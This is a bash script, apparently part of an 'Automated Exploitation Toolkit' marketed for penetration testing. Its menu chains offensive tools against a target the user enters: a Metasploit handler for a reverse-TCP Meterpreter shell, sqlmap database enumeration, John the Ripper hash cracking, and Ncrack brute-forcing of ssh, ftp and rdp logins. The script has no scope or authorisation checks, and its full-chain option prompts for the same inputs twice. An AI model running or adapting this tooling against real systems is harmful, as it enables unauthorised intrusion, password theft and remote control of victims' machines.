
#!/bin/bash

# === Script Directory Detection ===
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# === Source Libraries ===
source "$SCRIPT_DIR/run_tools.sh"
source "$SCRIPT_DIR/utilities.sh"

# === Color Codes ===
BYellow="\033[1;33m"
BRed="\033[1;31m"
BGreen="\033[1;32m"
BBlue="\033[1;34m"
BCyan="\033[1;36m"
White="\033[1;37m"
NC="\033[0m"

# === Default Variables ===
OUTPUT_DIR="exploitation_logs"
TARGET_IP=""
TARGET_URL=""
WORDLIST=""
HASH_FILE=""

# === Banner ===
display_banner() {
    clear
    echo -e "${BRed}"
    echo -e " █████╗ ██████╗ ██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗"
    echo -e "██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║"
    echo -e "███████║██████╔╝██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ███████║   ██║   ██║██║   ██║██╔██╗ ██║"
    echo -e "██╔══██║██╔═══╝ ██╔═══╝     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║"
    echo -e "██║  ██║██║     ██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║"
    echo -e "╚═╝  ╚═╝╚═╝     ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝"
    echo -e "${NC}"
    echo -e "${BYellow}              Automated Exploitation Toolkit${NC}"
    echo -e "${BBlue}           A Professional Penetration Testing Toolkit${NC}"
    echo -e ""
}

# === Exploitation Menu ===
display_exploitation_menu() {
    echo -e "\n${BYellow}╔════════════════════════════════════════════╗${NC}"
    echo -e "${BYellow}║           Exploitation Workflows            ║${NC}"
    echo -e "${BYellow}╚════════════════════════════════════════════╝${NC}"
    echo -e "${BCyan}1)${NC} ${White}Metasploit Framework${NC}"
    echo -e "${BCyan}2)${NC} ${White}SQL Injection (SQLmap)${NC}"
    echo -e "${BCyan}3)${NC} ${White}Password Cracking (John the Ripper)${NC}"
    echo -e "${BCyan}4)${NC} ${White}Service Bruteforce (Ncrack)${NC}"
    echo -e "${BCyan}5)${NC} ${White}Run Full Exploitation Chain${NC}"
    echo -e "${BCyan}0)${NC} ${White}Go Back (to Main Menu)${NC}"
    echo -e "${BYellow}╚════════════════════════════════════════════╝${NC}"
}

# === Exploitation Functions ===
run_metasploit_exploit() {
    read -p "Enter target IP: " target_ip
    read -p "Enter payload (default: windows/meterpreter/reverse_tcp): " payload
    payload=${payload:-windows/meterpreter/reverse_tcp}
    
    echo -e "${BGreen}[*] Generating Metasploit resource file...${NC}"
    local rcfile="$OUTPUT_DIR/msf_attack.rc"
    echo "use exploit/multi/handler" > "$rcfile"
    echo "set PAYLOAD $payload" >> "$rcfile"
    echo "set LHOST $(hostname -I | awk '{print $1}')" >> "$rcfile"
    echo "set LPORT 4444" >> "$rcfile"
    echo "set TARGET $target_ip" >> "$rcfile"
    echo "exploit -j -z" >> "$rcfile"
    
    echo -e "${BGreen}[*] Launching Metasploit...${NC}"
    msfconsole -r "$rcfile" | tee "$OUTPUT_DIR/msfconsole_output.txt"
}

run_sqlmap_attack() {
    read -p "Enter vulnerable URL: " target_url
    echo -e "${BGreen}[*] Running SQLmap on $target_url...${NC}"
    sqlmap -u "$target_url" --batch --dbs --output-dir="$OUTPUT_DIR/sqlmap"
    echo -e "${BGreen}[+] SQLmap scan completed. Results in $OUTPUT_DIR/sqlmap${NC}"
}

run_john_crack() {
    read -p "Enter path to hash file: " hash_file
    read -p "Enter path to wordlist (optional): " wordlist
    
    echo -e "${BGreen}[*] Starting John the Ripper...${NC}"
    if [ -n "$wordlist" ]; then
        john --wordlist="$wordlist" "$hash_file" --pot="$OUTPUT_DIR/john.pot"
    else
        john "$hash_file" --pot="$OUTPUT_DIR/john.pot"
    fi
    john --show "$hash_file" > "$OUTPUT_DIR/john_cracked.txt"
    echo -e "${BGreen}[+] Password cracking completed. Results in $OUTPUT_DIR/john_cracked.txt${NC}"
}

run_ncrack_attack() {
    read -p "Enter target IP: " target_ip
    read -p "Enter services (comma separated, e.g. ssh,ftp,rdp): " services
    services=${services:-ssh,ftp,rdp}
    read -p "Enter username (default: admin): " username
    username=${username:-admin}
    read -p "Enter path to wordlist: " wordlist
    
    echo -e "${BGreen}[*] Starting Ncrack bruteforce...${NC}"
    ncrack -p "$services" -u "$username" -P "$wordlist" "$target_ip" | tee "$OUTPUT_DIR/ncrack_results.txt"
    echo -e "${BGreen}[+] Ncrack completed. Results in $OUTPUT_DIR/ncrack_results.txt${NC}"
}

run_full_chain() {
    echo -e "${BYellow}[*] Starting Full Exploitation Chain${NC}"
    
    # Get common target
    read -p "Enter target IP: " target_ip
    read -p "Enter target URL (if web app): " target_url
    read -p "Enter path to wordlist: " wordlist
    read -p "Enter path to hash file: " hash_file
    
    mkdir -p "$OUTPUT_DIR/full_chain"
    
    # Run all tools
    [ -n "$target_url" ] && run_sqlmap_attack
    [ -n "$hash_file" ] && run_john_crack
    [ -n "$target_ip" ] && run_ncrack_attack
    [ -n "$target_ip" ] && run_metasploit_exploit
    
    echo -e "${BGreen}[+] Full exploitation chain completed!${NC}"
}

# === Main Menu Handler ===
run_exploitation_menu() {
    mkdir -p "$OUTPUT_DIR"
    
    while true; do
        display_banner
        display_exploitation_menu
        read -p "Choose an exploitation option: " choice
        
        case $choice in
            1) run_metasploit_exploit ;;
            2) run_sqlmap_attack ;;
            3) run_john_crack ;;
            4) run_ncrack_attack ;;
            5) run_full_chain ;;
            0) break ;;
            *) echo -e "${BRed}Invalid option. Please choose again.${NC}" ;;
        esac
        
        echo -e "\n${BCyan}Press Enter to continue...${NC}"; read
    done
}

# === Main Execution ===
run_exploitation_menu
